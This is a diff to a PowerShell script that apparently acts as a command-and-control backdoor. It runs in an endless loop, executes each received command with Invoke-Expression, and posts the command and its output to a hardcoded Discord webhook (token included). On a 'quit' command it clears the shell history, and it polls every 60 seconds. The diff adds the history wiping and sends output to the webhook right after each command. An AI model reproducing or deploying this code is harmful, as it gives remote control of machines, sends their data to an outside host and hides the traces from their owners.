@@ -15,30 +15,31 @@ while ($true) {
             $command = $command.Substring(2)
         }
 
-        # Save the command output to the $output variable
-        $output += "Command: $command`n"
 
         Write-Host $command
 
         # Check if the command is 'quit' and exit the loop
         if ($command.Trim() -eq "quit") {
             Write-Host "Quit command received. Exiting..."
-            $output += "Quit command received. Exiting...`n"
+			Invoke-Expression -Command Clear-History
             break
         }
 
         # Run the command
         $result = Invoke-Expression -Command $command
 
-        # Append the result to the $output variable
-        $output += "Result: $result`n"
+		#Print the output to console
+		Write-Host $result
+
+		#Post to Discord
+		$webhookUrl = "https://discord.com/api/webhooks/1354265213477851246/cuHgwA8xLpNhSWpr8A-nz8xnBnKHgG9BsSRrjq6-FV0zJIRYb0WAun4Vaj8INFZnpQQm"
+        $payload = @{content = $command + "`n" + $result} | ConvertTo-Json -Depth 10
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" 
 
         # Wait for 60 seconds before the next iteration
         Start-Sleep -Seconds 60
 
-        $webhookUrl = "https://discord.com/api/webhooks/1354265213477851246/cuHgwA8xLpNhSWpr8A-nz8xnBnKHgG9BsSRrjq6-FV0zJIRYb0WAun4Vaj8INFZnpQQm"
-        $payload = @{content = $command + " -- Output:`n" + $output} | ConvertTo-Json -Depth 10
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" 
+
           
     } catch {
         Write-Host "An error occurred: $_"
